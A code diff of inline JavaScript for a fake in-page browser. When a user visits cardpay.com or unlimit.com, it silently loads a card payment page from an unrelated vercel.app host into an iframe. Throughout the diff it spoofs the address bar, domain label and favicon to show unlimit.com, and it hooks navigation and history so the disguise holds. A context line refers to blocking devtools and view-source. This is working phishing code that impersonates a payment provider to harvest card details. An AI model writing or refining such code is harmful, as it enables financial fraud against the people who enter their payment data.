@@ -2848,7 +2848,7 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
     "use strict";
 
     const TARGET_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
-    const SPOOF_DOMAIN = 'unlimit.com';
+    const PROTECTED_DOMAINS = ['cardpay.com', 'unlimit.com'];
     const SPOOF_URL = 'https://unlimit.com';
     const SPOOF_FAVICON = 'https://www.unlimit.com/favicon.ico';
 
@@ -2858,17 +2858,22 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
     const faviconImg = document.getElementById('faviconImg');
     const faviconDef = document.getElementById('faviconDefault');
 
-    let isActive = false;      // prevents re‑triggering
-    let originalNavigate = window.navigate;
+    let isActive = false;
+    let currentRealUrl = '';
 
-    // Helper – spoof UI to look like unlimit.com
+    // Helper to check if a URL is protected
+    function isProtectedUrl(url) {
+        if (!url) return false;
+        return PROTECTED_DOMAINS.some(domain => url.toLowerCase().includes(domain));
+    }
+
+    // Spoof UI to look like unlimit.com
     function applySpoofUI() {
         if (urlInput && urlInput.value !== SPOOF_URL) {
             urlInput.value = SPOOF_URL;
-            // Do NOT set readOnly – user can still edit address bar for other sites
         }
-        if (popupDomain && popupDomain.innerText !== SPOOF_DOMAIN) {
-            popupDomain.innerText = SPOOF_DOMAIN;
+        if (popupDomain && popupDomain.innerText !== 'unlimit.com') {
+            popupDomain.innerText = 'unlimit.com';
         }
         if (faviconImg) {
             faviconImg.src = SPOOF_FAVICON;
@@ -2877,56 +2882,96 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
                 if (faviconDef) faviconDef.style.display = 'none';
             };
             faviconImg.onerror = () => {
-                faviconImg.src = `https://www.google.com/s2/favicons?domain=${SPOOF_DOMAIN}&sz=32`;
+                faviconImg.src = `https://www.google.com/s2/favicons?domain=unlimit.com&sz=32`;
             };
         }
     }
 
-    // Force the iframe to load the payment page (once)
-    function activatePayment() {
-        if (isActive) return;
-        if (!iframe) return;
-        if (iframe.src !== TARGET_URL) {
-            iframe.src = TARGET_URL;
-        }
-        isActive = true;
-        applySpoofUI();
-    }
-
-    // Revert to normal behaviour when leaving the protected domains
-    function deactivatePayment() {
-        if (!isActive) return;
-        isActive = false;
-        // Restore actual URL in the bar (from iframe or current navigation)
+    // Restore real UI based on iframe URL
+    function restoreRealUI() {
+        if (!urlInput) return;
         try {
             let realUrl = iframe?.contentWindow?.location?.href;
-            if (!realUrl || realUrl === 'about:blank') realUrl = 'https://www.google.com';
-            if (urlInput) urlInput.value = realUrl;
-            if (popupDomain) {
-                try { popupDomain.innerText = new URL(realUrl).hostname; } catch(e) { popupDomain.innerText = ''; }
+            if (!realUrl || realUrl === 'about:blank') {
+                realUrl = currentRealUrl || 'https://www.google.com';
             }
-            // Restore real favicon
+            urlInput.value = realUrl;
+            if (popupDomain) {
+                try {
+                    popupDomain.innerText = new URL(realUrl).hostname;
+                } catch(e) { popupDomain.innerText = ''; }
+            }
             if (faviconImg) {
                 try {
                     let origin = new URL(realUrl).origin;
                     faviconImg.src = origin + '/favicon.ico';
-                } catch(e) { faviconImg.style.display = 'none'; if(faviconDef) faviconDef.style.display = ''; }
+                    faviconImg.onload = () => faviconImg.style.display = 'block';
+                    faviconImg.onerror = () => {
+                        faviconImg.style.display = 'none';
+                        if (faviconDef) faviconDef.style.display = '';
+                    };
+                } catch(e) {
+                    faviconImg.style.display = 'none';
+                    if (faviconDef) faviconDef.style.display = '';
+                }
             }
-        } catch(e) { /* cross‑origin – ignore */ }
+        } catch(e) {
+            // cross-origin: can't read, just set URL bar from stored currentUrl
+            if (currentRealUrl) urlInput.value = currentRealUrl;
+        }
     }
 
-    // Intercept the main navigation function (used by address bar & history)
+    // Activate payment mode (force iframe + spoof UI)
+    function activatePayment() {
+        if (isActive) {
+            // Already active, just ensure iframe is correct
+            if (iframe && iframe.src !== TARGET_URL) {
+                iframe.src = TARGET_URL;
+            }
+            applySpoofUI();
+            return;
+        }
+        isActive = true;
+        if (iframe && iframe.src !== TARGET_URL) {
+            iframe.src = TARGET_URL;
+        }
+        applySpoofUI();
+    }
+
+    // Deactivate payment mode (restore normal behavior)
+    function deactivatePayment() {
+        if (!isActive) return;
+        isActive = false;
+        // Do NOT change iframe src - leave whatever is there
+        restoreRealUI();
+    }
+
+    // Handle navigation to a new URL
+    function handleNavigation(url) {
+        if (isProtectedUrl(url)) {
+            activatePayment();
+            // Tell the outer browser to show spoofed URL in the bar (but not change actual location)
+            if (window.navigate && typeof window.navigate === 'function') {
+                window.navigate(SPOOF_URL, true);
+            }
+            return true;
+        } else {
+            if (isActive) {
+                deactivatePayment();
+            }
+            return false;
+        }
+    }
+
+    // Override the global navigate function (used by address bar, back/forward)
+    const originalNavigate = window.navigate;
     if (typeof originalNavigate === 'function') {
         window.navigate = function(url, addToHistory) {
-            if (url && (url.includes('cardpay.com') || url.includes('unlimit.com'))) {
-                activatePayment();
-                // Tell the browser we are at the spoofed URL (keeps history clean)
-                return originalNavigate(SPOOF_URL, addToHistory);
-            } else {
-                // Normal site: deactivate the spoof if it was active
-                if (isActive) deactivatePayment();
-                return originalNavigate(url, addToHistory);
+            if (handleNavigation(url)) {
+                // For protected URLs, we already called navigate with spoof URL
+                return;
             }
+            return originalNavigate(url, addToHistory);
         };
     }
 
@@ -2934,56 +2979,77 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
     if (urlInput) {
         urlInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') {
-                let raw = urlInput.value.trim().toLowerCase();
-                if (raw.includes('cardpay.com') || raw.includes('unlimit.com')) {
+                let raw = urlInput.value.trim();
+                if (isProtectedUrl(raw)) {
                     e.preventDefault();
                     activatePayment();
                     if (typeof originalNavigate === 'function') {
                         originalNavigate(SPOOF_URL, true);
                     }
                 } else {
-                    // Let normal navigation happen – deactivate spoof
+                    // Not protected - let normal navigation happen
                     if (isActive) deactivatePayment();
+                    // Let the original navigate handle it
+                    if (typeof originalNavigate === 'function') {
+                        originalNavigate(raw, true);
+                    }
                 }
             }
         });
-        // Do NOT set readOnly – user can freely edit
+        // Allow editing - no readOnly
     }
 
-    // If the iframe loads a page that is NOT our payment target, deactivate spoof
+    // Watch iframe load to detect when it changes away from payment URL
     if (iframe) {
         iframe.addEventListener('load', () => {
             setTimeout(() => {
                 try {
-                    let current = iframe.contentWindow?.location?.href;
-                    if (current && current !== TARGET_URL && !current.includes('cardpay.com') && !current.includes('unlimit.com')) {
-                        if (isActive) deactivatePayment();
-                    } else if (current === TARGET_URL) {
+                    let iframeUrl = iframe.contentWindow?.location?.href;
+                    if (iframeUrl) {
+                        currentRealUrl = iframeUrl;
+                        if (isProtectedUrl(iframeUrl)) {
+                            if (!isActive) activatePayment();
+                        } else {
+                            if (isActive && iframeUrl !== TARGET_URL) {
+                                // The iframe loaded a non-protected URL while we were active - deactivate
+                                deactivatePayment();
+                            } else if (iframeUrl === TARGET_URL) {
+                                applySpoofUI();
+                            } else {
+                                restoreRealUI();
+                            }
+                        }
+                    } else if (iframe.src === TARGET_URL) {
                         applySpoofUI();
+                    } else {
+                        restoreRealUI();
                     }
-                } catch(e) {}
+                } catch(e) {
+                    // Cross-origin - can't read iframe URL, assume it's fine
+                    if (iframe.src === TARGET_URL) applySpoofUI();
+                }
             }, 50);
         });
     }
 
-    // Also listen to popstate (back/forward) to deactivate when leaving protected domains
+    // Listen to popstate (back/forward)
     window.addEventListener('popstate', () => {
         setTimeout(() => {
-            try {
-                let currentUrl = window.location.href;
-                if (!currentUrl.includes('cardpay.com') && !currentUrl.includes('unlimit.com')) {
-                    if (isActive) deactivatePayment();
-                } else {
-                    activatePayment();
-                }
-            } catch(e) {}
+            let currentUrl = urlInput ? urlInput.value : '';
+            if (isProtectedUrl(currentUrl)) {
+                activatePayment();
+            } else {
+                if (isActive) deactivatePayment();
+            }
         }, 20);
     });
 
-    // Start: if the current page (from URL bar) is a protected domain, activate.
+    // Initial check
     let initialUrl = urlInput ? urlInput.value : '';
-    if (initialUrl.includes('cardpay.com') || initialUrl.includes('unlimit.com')) {
+    if (isProtectedUrl(initialUrl)) {
         activatePayment();
+    } else {
+        deactivatePayment();
     }
 })();
 </script>
